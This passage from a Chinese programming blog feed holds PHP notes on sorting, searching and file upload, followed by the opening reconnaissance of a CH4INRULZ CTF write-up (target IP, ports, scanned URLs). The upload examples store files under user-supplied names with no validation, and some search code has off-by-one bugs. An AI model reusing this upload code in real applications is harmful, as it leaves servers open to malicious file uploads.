class="variable">$flag</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$flag</span>)&#123;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//插入排序，从大到小</span></span><br><span class="line"><span class="comment">2,4,1,3,5,8,6,9,7</span></span><br><span class="line"><span class="comment">4 &lt; 2? false           //4比2大，交换位置</span></span><br><span class="line"><span class="comment">4,2,1,3,5,8,6,9,7       //使用1再次比较之前的所有数据</span></span><br><span class="line"><span class="comment">1 &lt; 2? true             //因为1已经小于前面的第一个数据，不用交换，跳过</span></span><br><span class="line"><span class="comment">4,2,1,3,5,8,6,9,7       //使用3比较之前的所有数据</span></span><br><span class="line"><span class="comment">3 &lt; 1? false            //3比1大，交换位置</span></span><br><span class="line"><span class="comment">4,2,3,1,5,8,6,9,7       //使用3再次比较之前的所有数据</span></span><br><span class="line"><span class="comment">3 &lt; 2? false            //3比2大，交换位置</span></span><br><span class="line"><span class="comment">4,3,2,1,5,8,6,9,7       //以此循环</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p>快速排序（Quicksort）是对冒泡排序的一种改进。<br>快速排序由C. A. R. Hoare在1960年提出。它的基本思想是：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">8</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quick_sort</span>(<span class="params"><span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$len</span> &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">    <span class="variable">$l</span> = <span class="variable">$r</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="variable">$len</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="variable">$i</span>] &lt; <span class="variable">$arr</span>[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="variable">$l</span>[] = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$r</span>[] = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">quick_sort</span>(<span class="variable">$l</span>);</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">quick_sort</span>(<span class="variable">$r</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_merge</span>(<span class="variable">$l</span>,(<span class="keyword">array</span>)<span class="variable">$arr</span>[<span class="number">0</span>],<span class="variable">$r</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">quick_sort</span>(<span class="variable">$arr</span>));</span><br></pre></td></tr></table></figure><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>归并排序（Merge Sort）是建立在归并操作上的一种有效，稳定的排序算法，该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为二路归并。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> =  <span class="keyword">array</span>(<span class="number">2</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">6</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge_sort</span>(<span class="params"><span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//递归出口</span></span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$len</span> &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">    <span class="comment">//拆分数组</span></span><br><span class="line">    <span class="variable">$middle</span> = <span class="title function_ invoke__">floor</span>(<span class="variable">$len</span> / <span class="number">2</span>);</span><br><span class="line">    <span class="variable">$left</span> = <span class="title function_ invoke__">array_slice</span>(<span class="variable">$arr</span>,<span class="number">0</span>,<span class="variable">$middle</span>);</span><br><span class="line">    <span class="variable">$right</span> = <span class="title function_ invoke__">array_slice</span>(<span class="variable">$arr</span>,<span class="variable">$middle</span>);</span><br><span class="line">    <span class="comment">//递归点</span></span><br><span class="line">    <span class="variable">$left</span> = <span class="title function_ invoke__">merge_sort</span>(<span class="variable">$left</span>);</span><br><span class="line">    <span class="variable">$right</span> = <span class="title function_ invoke__">merge_sort</span>(<span class="variable">$right</span>);</span><br><span class="line">    <span class="comment">//二路归并</span></span><br><span class="line">    <span class="variable">$marr</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$left</span>) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$right</span>))&#123;</span><br><span class="line">        <span class="variable">$marr</span>[] = <span class="variable">$left</span>[<span class="number">0</span>] &gt; <span class="variable">$right</span>[<span class="number">0</span>] ? <span class="title function_ invoke__">array_shift</span>(<span class="variable">$left</span>) : <span class="title function_ invoke__">array_shift</span>(<span class="variable">$right</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_merge</span>(<span class="variable">$marr</span>,<span class="variable">$left</span>,<span class="variable">$right</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">merge_sort</span>(<span class="variable">$arr</span>));</span><br></pre></td></tr></table></figure><h2 id="查找算法"><a href="#查找算法" class="headerlink" title="查找算法"></a>查找算法</h2><h3 id="查找算法的含义"><a href="#查找算法的含义" class="headerlink" title="查找算法的含义"></a>查找算法的含义</h3><p>查找算法是在大量的信息中寻找一个特定的信息元素，在计算机应用中，查找是最常用的基本算法。查找算法是指实现查找过程对应的代码集。就是中大型数组中快速定位想要的元素。</p><h3 id="顺序查找算法"><a href="#顺序查找算法" class="headerlink" title="顺序查找算法"></a>顺序查找算法</h3><p>顺序查找也称为线性查找，从数据结构线形表的一端开始，顺序扫描，以此将扫描的结点关键字与给定的值比较，若相等则表示查找成功；若扫描结束乃没有找到关键字等于给定值的结点，表示查找失败。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_check</span>(<span class="params"><span class="variable">$arr</span>,<span class="variable">$res</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>,<span class="variable">$len</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>); <span class="variable">$i</span>&lt;<span class="variable">$len</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="variable">$i</span>] == <span class="variable">$res</span>) <span class="keyword">return</span> <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">7</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="number">50</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_check</span>(<span class="variable">$arr</span>,<span class="variable">$res</span>));</span><br></pre></td></tr></table></figure><h3 id="二分查找算法"><a href="#二分查找算法" class="headerlink" title="二分查找算法"></a>二分查找算法</h3><p>二分查找要求线性表中的结点按关键字值升序或降序排序，用给定值k先与中间结点的关键字比较，中间结点把线性表分成两个子表，若相等则查找成功；若不相等，再根据k与该中间结点关键字的比较结果确定下一步查找哪个子表。这样递归进行，直到查找到或查找结束发现表中没有这样的结点。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//二分查找算法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_check</span>(<span class="params"><span class="variable">$arr</span>,<span class="variable">$res</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">sort</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="variable">$right</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="variable">$lift</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$lift</span> &lt;= <span class="variable">$right</span>)&#123;</span><br><span class="line">        <span class="variable">$middle</span> = <span class="title function_ invoke__">floor</span>((<span class="variable">$right</span> + <span class="variable">$lift</span>) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="variable">$middle</span>] == <span class="variable">$res</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="variable">$middle</span>] &lt; <span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="variable">$lift</span> = <span class="variable">$middle</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$right</span> = <span class="variable">$middle</span> - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">4</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="number">2</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_check</span>(<span class="variable">$arr</span>,<span class="variable">$res</span>));</span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="前台表单"><a href="#前台表单" class="headerlink" title="前台表单"></a>前台表单</h3><p>文件上传表单中type属性值为file，enctype属性必须为multipart&#x2F;form-data。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;ch&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;filename&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h3><p>在PHP中有个超全局变量$_FLES，该变量专门用来接收用户上传的文件。<br>结构如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">array(5) &#123;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(25) &quot;这有啥好抑郁的.jpg&quot;</span><br><span class="line">  [&quot;type&quot;]=&gt;</span><br><span class="line">  string(10) &quot;image/jpeg&quot;</span><br><span class="line">  [&quot;tmp_name&quot;]=&gt;</span><br><span class="line">  string(22) &quot;C:\Windows\phpA1D3.tmp&quot;</span><br><span class="line">  [&quot;error&quot;]=&gt;</span><br><span class="line">  int(0)</span><br><span class="line">  [&quot;size&quot;]=&gt;</span><br><span class="line">  int(233237)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用php脚本把上传来的文件移动到指定目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多文件上传"><a href="#多文件上传" class="headerlink" title="多文件上传"></a>多文件上传</h3><h4 id="不同名文件"><a href="#不同名文件" class="headerlink" title="不同名文件"></a>不同名文件</h4><p>通过数组遍历的方式上传文件，都不需要知道name属性值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;ch&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span></span><br><span class="line">          content=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;文件上传&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;index.php&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;head&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;body&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;foot&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$value</span>[<span class="string">&#x27;tmp_name&#x27;</span>]) &amp;&amp; <span class="variable">$value</span>[<span class="string">&#x27;error&#x27;</span>] === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$value</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$value</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;文件上传成功&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;文件保存失败&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件上传失败&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="同名文件"><a href="#同名文件" class="headerlink" title="同名文件"></a>同名文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;ch&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span></span><br><span class="line">          content=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;文件上传&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;index.php&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;image[]&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;image[]&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;image[]&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_FILES</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>,<span class="variable">$len</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>][<span class="variable">$i</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>][<span class="variable">$i</span>],<span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>][<span class="variable">$i</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;文件上传成功&lt;br/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;文件移动失败&lt;br/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;文件上传失败&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="完结！！！"><a href="#完结！！！" class="headerlink" title="完结！！！"></a>完结！！！</h2><p><strong>撒花！！！！</strong></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CH4INRULZ_v1.0.1 Writeup</title>
      <link href="/posts/c47f/"/>
      <url>/posts/c47f/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Frank has a small website and he is a smart developer with a normal security background , he always love to follow patterns , your goal is to discover any critical vulnerabilities and gain access to the system , then you need to gain root access in order to capture the root flag.<br>This machine was made for Jordan’s Top hacker 2018 CTF , we tried to make it simulate a real world attacks in order to improve your penetration testing skills.<br>The machine was tested on vmware (player &#x2F; workstation) and works without any problems , so we recommend to use VMware to run it , Also works fine using virtualbox.<br>Difficulty: Intermediate , you need to think out of the box and collect all the puzzle pieces in order to get the job done.<br>The machine is already got DHCP enabled , so you will not have any problems with networking.<br>Happy Hacking !<br>v1 - 25&#x2F;07&#x2F;2018 v1.0.1 - 31&#x2F;07&#x2F;2018 <em>Fixes DHCP Issue</em><br>vulnhub：<a href="https://www.vulnhub.com/entry/ch4inrulz-101,247/">https://www.vulnhub.com/entry/ch4inrulz-101,247/</a></p></blockquote><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="https://img.xpctf.cn/img/20200814162007.png"><br>IP：192.168.1.20<br>端口：21，22，80，8011<br><img src="https://img.xpctf.cn/img/20200814162314.png"><br>FTP匿名登录，啥也没有；http目录扫描；nikto扫描。<br>发现三个比较有用的目录，依次打开看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.20:8011/api/index.html (CODE:200|SIZE:351)</span><br><span class="line">http://192.168.1.20/index.html.bak (CODE:200|SIZE:334) </span><br><span class="line">http://192.168.1.20/development (CODE:401|SIZE:479)</span><br></pre></td></tr></table></figure><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>访问&#x2F;api发现有个api列表，以此访问发现只有<code>files_api.php</code>存在，其他都是404</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">This API will be used to communicate with Frank&#x27;s 